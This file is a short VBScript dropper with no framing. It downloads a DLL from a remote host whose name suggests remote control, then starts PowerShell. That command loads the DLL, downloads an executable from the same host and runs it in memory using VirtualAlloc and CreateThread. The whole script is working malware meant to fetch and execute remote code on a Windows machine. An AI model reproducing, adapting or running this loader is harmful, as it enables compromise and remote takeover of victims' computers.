Set fso  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
path = folder & "\kd.dll"
http.Open "GET", "https://automacoes-remote-control.sgploq.easypanel.host/kd.dll", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.ResponseBody
st.SaveToFile path, 2
st.Close
Set sh = CreateObject("WScript.Shell")
cmd = "powershell -NoExit -Command ""$w=[Reflection.Assembly]::LoadFile('" & folder & "\kd.dll');$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');$m=[K.Win]::VirtualAlloc(0,[uint32]$b.Length,12288,64);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$d=[IntPtr]::Zero;[void][K.Win]::CreateThread(0,0,$m,0,0,[ref]$d)"""
sh.Run cmd, 1, False
